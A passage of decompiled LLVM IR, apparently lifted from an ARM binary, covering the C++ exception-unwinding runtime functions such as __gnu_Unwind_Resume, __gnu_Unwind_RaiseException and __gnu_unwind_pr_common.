  %v3_30f0c8 = load i32, i32* %v2_30f0c7, align 4
  %v2_30f109 = call i32 @get_eit_entry(i32 %ucbp, i32 %v3_30f0c8)
  store i32 %v2_30f109, i32* %r0.global-to-local, align 4
  %v2_30f1411 = icmp eq i32 %v2_30f109, 0
  br i1 %v2_30f1411, label %dec_label_pc_30f1c, label %dec_label_pc_30f4c

dec_label_pc_30f1c:                               ; preds = %entry, %dec_label_pc_30f1c.dec_label_pc_30f08_crit_edge
  %v0_30f1c = load i32, i32* @r5, align 4
  %v1_30f1c = add i32 %v0_30f1c, 64
  %v2_30f1c = inttoptr i32 %v1_30f1c to i32*
  %v3_30f1c = load i32, i32* %v2_30f1c, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_30f24 = load i32, i32* @r4, align 4
  %v2_30f24 = add i32 %v1_30f24, 20
  %v3_30f24 = inttoptr i32 %v2_30f24 to i32*
  store i32 %v3_30f1c, i32* %v3_30f24, align 4
  %v0_30f28 = load i32, i32* @r4, align 4
  %v1_30f30 = add i32 %v0_30f28, 16
  %v2_30f30 = inttoptr i32 %v1_30f30 to i32*
  %v3_30f30 = load i32, i32* %v2_30f30, align 4
  call void @__pseudo_branch(i32 %v3_30f30)
  %v0_30f3c = load i32, i32* %r0.global-to-local, align 4
  %v7_30f3c = icmp eq i32 %v0_30f3c, 8
  br i1 %v7_30f3c, label %dec_label_pc_30f1c.dec_label_pc_30f08_crit_edge, label %dec_label_pc_30f44

dec_label_pc_30f1c.dec_label_pc_30f08_crit_edge:  ; preds = %dec_label_pc_30f1c
  %v0_30f08.pre = load i32, i32* @r4, align 4
  %v0_30f0c.pre = load i32, i32* @r5, align 4
  store i32 %v0_30f08.pre, i32* %r0.global-to-local, align 4
  %v1_30f0c = add i32 %v0_30f0c.pre, 64
  %v2_30f0c = inttoptr i32 %v1_30f0c to i32*
  %v3_30f0c = load i32, i32* %v2_30f0c, align 4
  %v2_30f10 = call i32 @get_eit_entry(i32 %v0_30f08.pre, i32 %v3_30f0c)
  store i32 %v2_30f10, i32* %r0.global-to-local, align 4
  %v2_30f14 = icmp eq i32 %v2_30f10, 0
  br i1 %v2_30f14, label %dec_label_pc_30f1c, label %dec_label_pc_30f4c

dec_label_pc_30f44:                               ; preds = %dec_label_pc_30f1c
  %v7_30f44 = icmp eq i32 %v0_30f3c, 7
  br i1 %v7_30f44, label %dec_label_pc_30f50, label %dec_label_pc_30f4c

dec_label_pc_30f4c:                               ; preds = %entry, %dec_label_pc_30f1c.dec_label_pc_30f08_crit_edge, %dec_label_pc_30f44
  %v0_30f4c = call i32 @abort()
  store i32 %v0_30f4c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_30f50

dec_label_pc_30f50:                               ; preds = %dec_label_pc_30f44, %dec_label_pc_30f4c
  %v0_30f50 = load i32, i32* @r5, align 4
  %v1_30f50 = add i32 %v0_30f50, 4
  store i32 %v1_30f50, i32* %r0.global-to-local, align 4
  %v1_30f54 = inttoptr i32 %v1_30f50 to i32*
  %v2_30f54 = call i32 @__restore_core_regs(i32* %v1_30f54)
  store i32 %v2_30f54, i32* %r0.global-to-local, align 4
  ret void

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 4, 3, 7, 9, 8, 5, 6, 2, 1, 0 }
  uselistorder label %dec_label_pc_30f50, { 1, 0 }
  uselistorder label %dec_label_pc_30f4c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_30f1c, { 1, 0 }
}

define i32 @__gnu_Unwind_Resume(i32 %ucbp, i32 %entry_vrs) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  store i32 %entry_vrs, i32* %r1.global-to-local, align 4
  %v1_30f58 = add i32 %ucbp, 20
  %v2_30f58 = inttoptr i32 %v1_30f58 to i32*
  %v3_30f58 = load i32, i32* %v2_30f58, align 4
  %v1_30f60 = load i32, i32* %r1.global-to-local, align 4
  %v2_30f60 = add i32 %v1_30f60, 64
  %v3_30f60 = inttoptr i32 %v2_30f60 to i32*
  store i32 %v3_30f58, i32* %v3_30f60, align 4
  %v1_30f64 = add i32 %ucbp, 12
  %v2_30f64 = inttoptr i32 %v1_30f64 to i32*
  %v3_30f64 = load i32, i32* %v2_30f64, align 4
  %v2_30f68 = icmp eq i32 %v3_30f64, 0
  store i32 %ucbp, i32* @r4, align 4
  %v0_30f74 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_30f74, i32* @r5, align 4
  br i1 %v2_30f68, label %dec_label_pc_30f7c, label %dec_label_pc_30fb8

dec_label_pc_30f7c:                               ; preds = %entry
  store i32 %ucbp, i32* %r1.global-to-local, align 4
  %v1_30f88 = add i32 %ucbp, 16
  %v2_30f88 = inttoptr i32 %v1_30f88 to i32*
  %v3_30f88 = load i32, i32* %v2_30f88, align 4
  call void @__pseudo_branch(i32 %v3_30f88)
  br i1 false, label %dec_label_pc_30fb0, label %dec_label_pc_30f9c

dec_label_pc_30f9c:                               ; preds = %dec_label_pc_30f7c
  call void @__pseudo_cond_branch(i1 true, i32 ptrtoint (i32* @global_var_26764.3322 to i32))
  %v0_30fa4 = load i32, i32* @r4, align 4
  %v0_30fa8 = load i32, i32* @r5, align 4
  store i32 %v0_30fa8, i32* %r1.global-to-local, align 4
  call void @unwind_phase2(i32 %v0_30fa4, i32 %v0_30fa8)
  br label %dec_label_pc_30fb0

dec_label_pc_30fb0:                               ; preds = %dec_label_pc_30f7c, %dec_label_pc_30f9c
  %v0_30fb0 = load i32, i32* @r5, align 4
  %v1_30fb0 = add i32 %v0_30fb0, 4
  %v1_30fb4 = inttoptr i32 %v1_30fb0 to i32*
  %v2_30fb4 = call i32 @__restore_core_regs(i32* %v1_30fb4)
  %v1_30fbc.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_30fb8

dec_label_pc_30fb8:                               ; preds = %entry, %dec_label_pc_30fb0
  %v1_30fbc = phi i32 [ %v0_30f74, %entry ], [ %v1_30fbc.pre, %dec_label_pc_30fb0 ]
  %v3_30fbc = call i32 @unwind_phase2_forced(i32 1, i32 %v1_30fbc, i32 1)
  %v0_30fc0 = call i32 @abort()
  ret i32 %v0_30fc0

; uselistorder directives
  uselistorder i32* %r1.global-to-local, { 3, 4, 0, 1, 2 }
  uselistorder i32 ()* @abort, { 7, 6, 5, 4, 10, 3, 2, 9, 8, 1, 0 }
  uselistorder void (i1, i32)* @__pseudo_cond_branch, { 83, 84, 85, 86, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 8, 6, 7, 9, 10, 11, 12, 41, 42, 43, 44, 45, 46, 47, 48, 49, 52, 53, 54, 55, 56, 72, 73, 74, 75, 13, 87, 16, 89, 68, 65, 66, 67, 62, 63, 64, 69, 51, 76, 70, 71, 57, 58, 59, 60, 61, 50, 17, 18, 19, 20, 21, 0, 94, 98, 97, 96, 90, 91, 1, 22, 23, 14, 24, 25, 26, 92, 93, 95, 81, 82, 78, 2, 79, 77, 15, 80, 88, 3, 4, 5 }
  uselistorder i1 true, { 0, 3, 4, 5, 6, 7, 1, 151, 2, 132, 8, 9, 10, 11, 12, 13, 123, 124, 133, 134, 125, 14, 15, 16, 126, 127, 128, 135, 17, 18, 19, 20, 23, 22, 21, 153, 154, 155, 156, 157, 158, 159, 129, 160, 161, 162, 139, 163, 164, 165, 166, 130, 167, 168, 169, 170, 171, 172, 173, 24, 174, 152, 175, 25, 26, 176, 177, 178, 179, 180, 27, 181, 182, 28, 29, 30, 31, 32, 136, 183, 33, 184, 185, 186, 187, 34, 106, 140, 188, 35, 105, 189, 36, 104, 190, 191, 192, 193, 37, 194, 141, 38, 108, 195, 39, 107, 196, 197, 40, 198, 199, 200, 41, 201, 202, 147, 44, 45, 46, 47, 42, 43, 148, 48, 203, 204, 49, 109, 50, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 52, 111, 53, 215, 216, 217, 54, 110, 218, 55, 51, 219, 220, 149, 56, 221, 222, 58, 113, 59, 223, 224, 120, 225, 131, 226, 227, 57, 114, 228, 229, 230, 60, 112, 231, 61, 115, 232, 233, 234, 62, 235, 236, 237, 238, 239, 63, 64, 142, 65, 66, 67, 68, 150, 116, 240, 241, 242, 138, 243, 137, 69, 117, 118, 244, 144, 245, 246, 71, 247, 248, 72, 119, 250, 70, 251, 249, 252, 143, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 121, 93, 94, 95, 96, 122, 253, 254, 255, 97, 256, 257, 98, 258, 99, 146, 259, 260, 145, 100, 101, 102, 103 }
  uselistorder i32 %ucbp, { 1, 0, 2, 4, 3 }
  uselistorder label %dec_label_pc_30fb8, { 1, 0 }
  uselistorder label %dec_label_pc_30fb0, { 1, 0 }
}

define i32 @__gnu_Unwind_RaiseException(i32 %ucbp, i32 %entry_vrs) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-248 = alloca i32, align 4
  %saved_vrs_-320 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_30fc4 = load i32, i32* @r4, align 4
  store i32 %v3_30fc4, i32* %stack_var_-16, align 4
  %v6_30fc4 = load i32, i32* @r5, align 4
  %v9_30fc4 = load i32, i32* @r6, align 4
  %v12_30fc4 = load i32, i32* @lr, align 4
  %v1_30fc8 = add i32 %entry_vrs, 60
  %v2_30fc8 = inttoptr i32 %v1_30fc8 to i32*
  %v3_30fc8 = load i32, i32* %v2_30fc8, align 4
  %v2_30fcc = add i32 %entry_vrs, 64
  %v3_30fcc = inttoptr i32 %v2_30fcc to i32*
  store i32 %v3_30fc8, i32* %v3_30fcc, align 4
  store i32 %entry_vrs, i32* @r6, align 4
  store i32 %ucbp, i32* @r5, align 4
  %v11_30ffc = load i32, i32* %v3_30fcc, align 4
  store i32 -1, i32* %saved_vrs_-320, align 4
  %v2_31014 = call i32 @get_eit_entry(i32 %ucbp, i32 %v11_30ffc)
  %v2_31018 = icmp eq i32 %v2_31014, 0
  br i1 %v2_31018, label %dec_label_pc_31020, label %dec_label_pc_31054

dec_label_pc_31020:                               ; preds = %entry
  %v0_31020 = load i32, i32* @r5, align 4
  %v1_31028 = add i32 %v0_31020, 16
  %v2_31028 = inttoptr i32 %v1_31028 to i32*
  %v3_31028 = load i32, i32* %v2_31028, align 4
  call void @__pseudo_branch(i32 %v3_31028)
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_31040 = load i32, i32* %saved_vrs_-320, align 4
  %v1_31044 = urem i32 %v2_31040, 2
  %v2_31044 = icmp eq i32 %v1_31044, 0
  br i1 %v2_31044, label %dec_label_pc_31064, label %dec_label_pc_3104c

dec_label_pc_3104c:                               ; preds = %dec_label_pc_31020, %dec_label_pc_31064
  %v0_3104c = phi i1 [ false, %dec_label_pc_31020 ], [ %phitmp, %dec_label_pc_31064 ]
  br i1 %v0_3104c, label %dec_label_pc_31070, label %dec_label_pc_31054

dec_label_pc_31054:                               ; preds = %entry, %dec_label_pc_3104c
  %v2_3105c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_3105c, i32* @r4, align 4
  store i32 %v6_30fc4, i32* @r5, align 4
  store i32 %v9_30fc4, i32* @r6, align 4
  store i32 %v12_30fc4, i32* @lr, align 4
  ret i32 9

dec_label_pc_31064:                               ; preds = %dec_label_pc_31020
  %v2_31064 = ptrtoint i32* %stack_var_-248 to i32
  store i32 %v2_31064, i32* @r0, align 4
  %v1_31068 = call i32 @__gnu_Unwind_Restore_VFP(i32 %v2_31064)
  %v0_3104c.pre = load i32, i32* %r4.global-to-local, align 4
  %phitmp = icmp eq i32 %v0_3104c.pre, 6
  br label %dec_label_pc_3104c

dec_label_pc_31070:                               ; preds = %dec_label_pc_3104c
  %v0_31070 = load i32, i32* @r5, align 4
  %v0_31074 = load i32, i32* @r6, align 4
  call void @unwind_phase2(i32 %v0_31070, i32 %v0_31074)
  ret i32 ptrtoint (i32* @0 to i32)

; uselistorder directives
  uselistorder void (i32, i32)* @unwind_phase2, { 1, 0 }
  uselistorder i32 (i32, i32)* @get_eit_entry, { 3, 2, 0, 1 }
  uselistorder i32 %entry_vrs, { 0, 2, 1 }
  uselistorder label %dec_label_pc_31054, { 1, 0 }
  uselistorder label %dec_label_pc_3104c, { 1, 0 }
}

define i32 @__gnu_Unwind_Resume_or_Rethrow(i32 %ucbp, i32 %entry_vrs) local_unnamed_addr {
entry:
  %v1_3107c = add i32 %ucbp, 12
  %v2_3107c = inttoptr i32 %v1_3107c to i32*
  %v3_3107c = load i32, i32* %v2_3107c, align 4
  %v2_31080 = icmp eq i32 %v3_3107c, 0
  br i1 %v2_31080, label %dec_label_pc_31088, label %dec_label_pc_3108c

dec_label_pc_31088:                               ; preds = %entry
  %v2_31088 = call i32 @__gnu_Unwind_RaiseException(i32 0, i32 %entry_vrs)
  br label %dec_label_pc_3108c

dec_label_pc_3108c:                               ; preds = %entry, %dec_label_pc_31088
  %v1_3108c = add i32 %entry_vrs, 60
  %v2_3108c = inttoptr i32 %v1_3108c to i32*
  %v3_3108c = load i32, i32* %v2_3108c, align 4
  %v2_31094 = add i32 %entry_vrs, 64
  %v3_31094 = inttoptr i32 %v2_31094 to i32*
  store i32 %v3_3108c, i32* %v3_31094, align 4
  %v3_31098 = call i32 @unwind_phase2_forced(i32 0, i32 %entry_vrs, i32 0)
  ret i32 %v3_31098

; uselistorder directives
  uselistorder i32 (i32, i32, i32)* @unwind_phase2_forced, { 2, 0, 1 }
  uselistorder i32 %entry_vrs, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_3108c, { 1, 0 }
}

define i32 @_Unwind_VRS_Pop(i32 %context, i32 %regclass, i32 %discriminator, i32 %representation) local_unnamed_addr {
entry:
  %tmp = icmp ult i32 %regclass, 5
  br i1 %tmp, label %bb, label %dec_label_pc_310f8

bb:                                               ; preds = %entry
  %v7_310b0 = mul i32 %regclass, 4
  %v8_310b0 = add i32 %v7_310b0, ptrtoint (i32* @global_var_310b8.3635 to i32)
  call void @__pseudo_branch(i32 %v8_310b0)
  br label %dec_label_pc_310f8

dec_label_pc_310f8:                               ; preds = %bb, %entry
  ret i32 2

; uselistorder directives
  uselistorder i32 %regclass, { 1, 0 }
}

define i32 @__gnu_unwind_pr_common(i32 %state, i32 %ucbp, i32 %context, i32 %id) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %context, i32* %r2.global-to-local, align 4
  store i32 %state, i32* %r0.global-to-local, align 4
  %forced_unwind_-44 = alloca i32, align 4
  %uws_-60 = alloca %anon_struct_4, align 8
  %stack_var_-48 = alloca i32, align 4
  %v3_311e0 = load i32, i32* @r4, align 4
  %v6_311e0 = load i32, i32* @r5, align 4
  %v2_311f0 = icmp eq i32 %id, 0
  store i32 %ucbp, i32* @r8, align 4
  %v1_311f8 = add i32 %ucbp, 76
  %v2_311f8 = inttoptr i32 %v1_311f8 to i32*
  %v3_311f8 = load i32, i32* %v2_311f8, align 4
  %v1_31204 = inttoptr i32 %v3_311f8 to i32*
  %v2_31204 = load i32, i32* %v1_31204, align 4
  store i32 %v2_31204, i32* @lr, align 4
  %v4_31204 = add i32 %v3_311f8, 4
  store i32 %context, i32* %fp.global-to-local, align 4
  %v1_31210 = urem i32 %state, 4
  store i32 %v1_31210, i32* %r2.global-to-local, align 4
  %v1_31214 = and i32 %state, 8
  store i32 %v1_31214, i32* %r0.global-to-local, align 4
  %v4_31224 = getelementptr inbounds %anon_struct_4, %anon_struct_4* %uws_-60, i32 0, i32 0
  store i32 %v2_31204, i32* %v4_31224, align 8
  br i1 %v2_311f0, label %dec_label_pc_31234, label %dec_label_pc_31510

dec_label_pc_31234:                               ; preds = %entry
  %v3_31234 = mul i32 %v2_31204, 256
  store i32 %v3_31234, i32* %v4_31224, align 8
  store i32 3, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_3124c

dec_label_pc_3124c:                               ; preds = %dec_label_pc_31510, %dec_label_pc_31234
  %v0_31270647090 = phi i32 [ %v2_31528, %dec_label_pc_31510 ], [ %v4_31204, %dec_label_pc_31234 ]
  store i32 %v1_31210, i32* %r2.global-to-local, align 4
  %v1_31250 = add i32 %ucbp, 80
  %v2_31250 = inttoptr i32 %v1_31250 to i32*
  %v3_31250 = load i32, i32* %v2_31250, align 4
  %v7_31254 = icmp eq i32 %v1_31210, 2
  br i1 %v7_31254, label %bb, label %bb148

bb:                                               ; preds = %dec_label_pc_3124c
  %v2_31258 = add i32 %ucbp, 56
  %v3_31258 = inttoptr i32 %v2_31258 to i32*
  %v4_31258 = load i32, i32* %v3_31258, align 4
  br label %bb148

bb148:                                            ; preds = %dec_label_pc_3124c, %bb
  %v0_312706470 = phi i32 [ %v0_31270647090, %dec_label_pc_3124c ], [ %v4_31258, %bb ]
  %v1_3125c = urem i32 %v3_31250, 2
  %v2_3125c = icmp eq i32 %v1_3125c, 0
  br i1 %v2_3125c, label %dec_label_pc_31270.preheader, label %bb149

bb149:                                            ; preds = %bb148
  br label %dec_label_pc_31330

dec_label_pc_31270.preheader:                     ; preds = %bb148
  %v1_312706571 = inttoptr i32 %v0_312706470 to i32*
  %v2_312706672 = load i32, i32* %v1_312706571, align 4
  %v2_312746874 = icmp eq i32 %v2_312706672, 0
  br i1 %v2_312746874, label %dec_label_pc_31330, label %dec_label_pc_3127c.preheader.lr.ph.lr.ph

dec_label_pc_3127c.preheader.lr.ph.lr.ph:         ; preds = %dec_label_pc_31270.preheader
  %v7_31280 = icmp eq i32 %id, 2
  %v2_3130c = icmp eq i32 %v1_31210, 0
  %v2_314d8 = ptrtoint i32* %forced_unwind_-44 to i32
  %v3_313f4 = icmp eq i32 %v1_31214, 0
  br label %dec_label_pc_3127c.preheader.lr.ph

dec_label_pc_3127c.preheader.lr.ph:               ; preds = %dec_label_pc_3127c.preheader.lr.ph.lr.ph, %dec_label_pc_31544
  %v1_3128c96 = phi i32 [ %v2_312706672, %dec_label_pc_3127c.preheader.lr.ph.lr.ph ], [ %v2_3127066, %dec_label_pc_31544 ]
  %v1_3128893 = phi i32 [ %v0_312706470, %dec_label_pc_3127c.preheader.lr.ph.lr.ph ], [ %v2_31548, %dec_label_pc_31544 ]
  %stack_var_-76.2.ph3175 = phi i32 [ 0, %dec_label_pc_3127c.preheader.lr.ph.lr.ph ], [ %stack_var_-76.4, %dec_label_pc_31544 ]
  br label %dec_label_pc_3127c.preheader

dec_label_pc_3127c.preheader:                     ; preds = %dec_label_pc_3127c.preheader.lr.ph, %dec_label_pc_31508
  %v1_3128c95 = phi i32 [ %v1_3128c96, %dec_label_pc_3127c.preheader.lr.ph ], [ %v2_31270, %dec_label_pc_31508 ]
  %v1_3128892 = phi i32 [ %v1_3128893, %dec_label_pc_3127c.preheader.lr.ph ], [ %v1_31508, %dec_label_pc_31508 ]
  br label %dec_label_pc_3127c

dec_label_pc_3127c:                               ; preds = %dec_label_pc_3127c.preheader, %dec_label_pc_31320
  %v1_3128c = phi i32 [ %v1_3128c95, %dec_label_pc_3127c.preheader ], [ %v2_31324, %dec_label_pc_31320 ]
  %v1_312a0 = phi i32 [ %v1_3128892, %dec_label_pc_3127c.preheader ], [ %v1_31320, %dec_label_pc_31320 ]
  store i32 %id, i32* %r2.global-to-local, align 4
  br i1 %v7_31280, label %bb151, label %.thread16

bb151:                                            ; preds = %dec_label_pc_3127c
  %v2_31284 = add i32 %v1_312a0, 4
  %v3_31284 = inttoptr i32 %v2_31284 to i32*
  %v4_31284 = load i32, i32* %v3_31284, align 4
  store i32 %v4_31284, i32* @r5, align 4
  store i32 %v1_3128c, i32* @r6, align 4
  %v0_31290109 = load i32, i32* @r8, align 4
  %v1_31290110 = add i32 %v0_31290109, 72
  %v2_31290111 = inttoptr i32 %v1_31290110 to i32*
  %v3_31290112 = load i32, i32* %v2_31290111, align 4
  store i32 %v3_31290112, i32* @lr, align 4
  %v2_3129c = add i32 %v1_312a0, 8
  br label %bb152

.thread16:                                        ; preds = %dec_label_pc_3127c
  %v2_31288 = add i32 %v1_312a0, 2
  %v3_31288 = inttoptr i32 %v2_31288 to i16*
  %v4_31288 = load i16, i16* %v3_31288, align 2
  %v5_31288 = zext i16 %v4_31288 to i32
  store i32 %v5_31288, i32* @r5, align 4
  %v0_31290 = load i32, i32* @r8, align 4
  %v1_31290 = add i32 %v0_31290, 72
  %v2_31290 = inttoptr i32 %v1_31290 to i32*
  %v3_31290 = load i32, i32* %v2_31290, align 4
  store i32 %v3_31290, i32* @lr, align 4
  %v2_31298 = inttoptr i32 %v1_312a0 to i16*
  %v3_31298 = load i16, i16* %v2_31298, align 2
  %v4_31298 = zext i16 %v3_31298 to i32
  store i32 %v4_31298, i32* @r6, align 4
  %v2_312a0 = add i32 %v1_312a0, 4
  br label %bb152

bb152:                                            ; preds = %bb151, %.thread16
  %storemerge121 = phi i32 [ %v2_312a0, %.thread16 ], [ %v2_3129c, %bb151 ]
  %v3_31290115 = phi i32 [ %v3_31290, %.thread16 ], [ %v3_31290112, %bb151 ]
  %v0_312a8113 = phi i32 [ %v5_31288, %.thread16 ], [ %v4_31284, %bb151 ]
  store i32 %storemerge121, i32* @r7, align 4
  %v1_312a8 = and i32 %v0_312a8113, -2
  %v2_312ac = add i32 %v1_312a8, %v3_31290115
  store i32 %v2_312ac, i32* @r4, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v0_312bc = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_312bc, i32* %r0.global-to-local, align 4
  %v5_312c8 = call i32 @_Unwind_VRS_Get(i32 %v0_312bc, i32 15, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_312c8, i32* %r0.global-to-local, align 4
  %v3_312cc = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_312cc, i32* %r2.global-to-local, align 4
  %v0_312d0 = load i32, i32* @r4, align 4
  %tmp = icmp ugt i32 %v0_312d0, %v3_312cc
  br i1 %tmp, label %._crit_edge, label %dec_label_pc_312dc

._crit_edge:                                      ; preds = %bb152
  %v0_312f4.pre = load i32, i32* @r6, align 4
  br label %bb154

dec_label_pc_312dc:                               ; preds = %bb152
  %v0_312dc = load i32, i32* @r6, align 4
  %v1_312dc = and i32 %v0_312dc, -2
  %v2_312e0 = add i32 %v1_312dc, %v0_312d0
  %v3_312e4 = icmp ult i32 %v3_312cc, %v2_312e0
  br i1 %v3_312e4, label %.thread20, label %bb153

bb153:                                            ; preds = %dec_label_pc_312dc
  br label %bb154

.thread20:                                        ; preds = %dec_label_pc_312dc
  br label %bb154

bb154:                                            ; preds = %bb153, %._crit_edge, %.thread20
  %v0_312f4 = phi i32 [ %v0_312f4.pre, %._crit_edge ], [ %v0_312dc, %bb153 ], [ %v0_312dc, %.thread20 ]
  %v0_3149c = phi i32 [ 0, %._crit_edge ], [ 0, %bb153 ], [ 1, %.thread20 ]
  %v0_312f0 = load i32, i32* @r5, align 4
  %v1_312f4 = urem i32 %v0_312f4, 2
  %v1_312f0 = mul i32 %v0_312f0, 2
  %v3_312f8 = and i32 %v1_312f0, 2
  %v4_312f8 = or i32 %v3_312f8, %v1_312f4
  store i32 %v4_312f8, i32* %r2.global-to-local, align 4
  %v7_312fc = icmp eq i32 %v4_312f8, 1
  br i1 %v7_312fc, label %dec_label_pc_31490, label %dec_label_pc_31304

dec_label_pc_31304:                               ; preds = %bb154
  %v2_312fc = icmp eq i32 %v4_312f8, 0
  br i1 %v2_312fc, label %dec_label_pc_31308, label %dec_label_pc_313b8

dec_label_pc_31308:                               ; preds = %dec_label_pc_31304
  store i32 %v1_31210, i32* %r2.global-to-local, align 4
  br i1 %v2_3130c, label %.thread, label %bb155

.thread:                                          ; preds = %dec_label_pc_31308
  %v0_31320119 = load i32, i32* @r7, align 4
  br label %dec_label_pc_31320

bb155:                                            ; preds = %dec_label_pc_31308
  %v2_31318 = icmp eq i32 %v0_3149c, 0
  %v0_31320 = load i32, i32* @r7, align 4
  br i1 %v2_31318, label %dec_label_pc_31320, label %dec_label_pc_31698

dec_label_pc_31320:                               ; preds = %.thread, %bb155
  %v0_31320120 = phi i32 [ %v0_31320119, %.thread ], [ %v0_31320, %bb155 ]
  %v1_31320 = add i32 %v0_31320120, 4
  %v1_31324 = inttoptr i32 %v1_31320 to i32*
  %v2_31324 = load i32, i32* %v1_31324, align 4
  %v2_31328 = icmp eq i32 %v2_31324, 0
  br i1 %v2_31328, label %dec_label_pc_31330, label %dec_label_pc_3127c

dec_label_pc_31330:                               ; preds = %dec_label_pc_31544, %dec_label_pc_31508, %dec_label_pc_31320, %dec_label_pc_31270.preheader, %bb149
  %stack_var_-76.3 = phi i32 [ 0, %bb149 ], [ 0, %dec_label_pc_31270.preheader ], [ %stack_var_-76.2.ph3175, %dec_label_pc_31320 ], [ %stack_var_-76.2.ph3175, %dec_label_pc_31508 ], [ %stack_var_-76.4, %dec_label_pc_31544 ]
  %v0_31330 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_31330, i32* %r0.global-to-local, align 4
  %tmp156 = bitcast %anon_struct_4* %uws_-60 to %anon_struct_13*
  %v4_31338 = call i32 @__gnu_unwind_execute(i32 %v0_31330, %anon_struct_13* %tmp156)
  store i32 %v4_31338, i32* %r0.global-to-local, align 4
  store i32 %v4_31338, i32* %r5.global-to-local, align 4
  %v2_3133c = icmp eq i32 %v4_31338, 0
  br i1 %v2_3133c, label %dec_label_pc_31344, label %dec_label_pc_313c0

dec_label_pc_31344:                               ; preds = %dec_label_pc_31330
  store i32 %stack_var_-76.3, i32* %r2.global-to-local, align 4
  %v2_31348 = icmp eq i32 %stack_var_-76.3, 0
  br i1 %v2_31348, label %bb157, label %dec_label_pc_31354

bb157:                                            ; preds = %dec_label_pc_31344
  store i32 8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_313c4

dec_label_pc_31354:                               ; preds = %dec_label_pc_31344
  %v2_31354 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_31354, i32* %r4.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v0_31364 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_31364, i32* %r0.global-to-local, align 4
  %tmp158 = bitcast i32* %stack_var_-48 to i8*
  %v7_3136c = call i32 @_Unwind_VRS_Get(i32 %v0_31364, i32 0, i32 15, i32 0, i8* %tmp158)
  %v0_31370 = load i32, i32* %r5.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 %v0_31364, i32* %r0.global-to-local, align 4
  %v5_31384 = call i32 @_Unwind_VRS_Set(i32 %v0_31364, i32 %v0_31370, i32 14, i32 %v0_31370, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_31384, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32* %r2.global-to-local, align 4
  %v4_31390 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 40) to i32*), align 4
  %v0_31394 = load i32, i32* %r5.global-to-local, align 4
  %v0_31398 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_31398, i32* %r0.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 %v4_31390, i32* %stack_var_-48, align 4
  %v5_313ac = call i32 @_Unwind_VRS_Set(i32 %v0_31398, i32 %v0_31394, i32 15, i32 %v0_31394, i8* bitcast (i32* @0 to i8*))
  store i32 7, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_313c4

dec_label_pc_313b8:                               ; preds = %dec_label_pc_31304
  %v7_313b8 = icmp eq i32 %v4_312f8, 2
  br i1 %v7_313b8, label %dec_label_pc_313d0, label %dec_label_pc_313c0

dec_label_pc_313c0:                               ; preds = %dec_label_pc_313b8, %dec_label_pc_314a4, %dec_label_pc_31330, %dec_label_pc_31698
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_313c4

dec_label_pc_313c4:                               ; preds = %bb157, %dec_label_pc_316d0, %dec_label_pc_31660, %bb166, %dec_label_pc_31354, %dec_label_pc_313c0
  %v1_313cc = phi i32 [ 8, %bb157 ], [ 7, %dec_label_pc_316d0 ], [ %v1_313cc.pre, %dec_label_pc_31660 ], [ 7, %bb166 ], [ 7, %dec_label_pc_31354 ], [ 9, %dec_label_pc_313c0 ]
  store i32 %v3_311e0, i32* %r4.global-to-local, align 4
  store i32 %v6_311e0, i32* %r5.global-to-local, align 4
  ret i32 %v1_313cc

dec_label_pc_313d0:                               ; preds = %dec_label_pc_313b8
  store i32 %v1_31210, i32* %r2.global-to-local, align 4
  %v0_313d4 = load i32, i32* @r7, align 4
  %v1_313d4 = inttoptr i32 %v0_313d4 to i32*
  %v2_313d4 = load i32, i32* %v1_313d4, align 4
  %tmp206 = bitcast i32 %v2_313d4 to float
  %tmp207 = call float @fabsf(float %tmp206)
  %v1_313dc = bitcast float %tmp207 to i32
  store i32 %v1_313dc, i32* @sl, align 4
  br i1 %v2_3130c, label %dec_label_pc_313e4, label %dec_label_pc_31550

dec_label_pc_313e4:                               ; preds = %dec_label_pc_313d0
  %v2_313e4 = icmp eq i32 %v0_3149c, 0
  br i1 %v2_313e4, label %dec_label_pc_31538, label %dec_label_pc_313ec

dec_label_pc_313ec:                               ; preds = %dec_label_pc_313e4
  %v2_313f0 = icmp eq i32 %v1_313dc, 0
  br i1 %v2_313f0, label %dec_label_pc_313fc.thread, label %bb159

dec_label_pc_313fc.thread:                        ; preds = %dec_label_pc_313ec
  br label %dec_label_pc_31660

bb159:                                            ; preds = %dec_label_pc_313ec
